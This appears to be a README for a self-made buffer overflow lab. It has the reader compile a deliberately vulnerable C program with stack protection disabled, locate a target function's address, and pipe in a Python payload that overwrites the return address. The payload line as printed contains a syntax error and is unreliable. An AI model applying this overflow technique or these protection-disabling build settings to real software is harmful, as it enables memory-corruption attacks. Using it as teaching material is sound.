# BufferOverflow
Writing a buffer overflow vulnerability and exploiting it.

# Quick Start
1. Compile the c file. Disabling stack protection and compiling for a 32 bit machine.

	`$ gcc -fno-stack-protector -m32 vulnerability.c`

2. Detrmine the address of the malicious function on your machine. You can do this in two ways.

	a. Easy method. run `./a.out` and it will print the address for you.<br>
	b. Cooler method. run `objdump -d a.out | less` and find the address manually.
  
3. Determine if you are on a Big Endian or Little Endian Machine. You can probably google this.

4. Run the injection using your malicious address in the proper LE/BE order
  
	`python -c 'print "a"*32 . + "\xa0\x84\x04\x08"' | a.out`
  
	Note: If you are on a LE machine, inject a LE ordered address. Otherwise, inject a BE ordered address.
  My malicious address was 080484a0 on a LE macine.
  



# Debugging
The malicious print statement was not printing until I flushed the printf buffer by adding a new line character '\n'.
If you are messing around with this, don't forget to flush the buffer or will just receive seg faults and not feel like a hacker :(
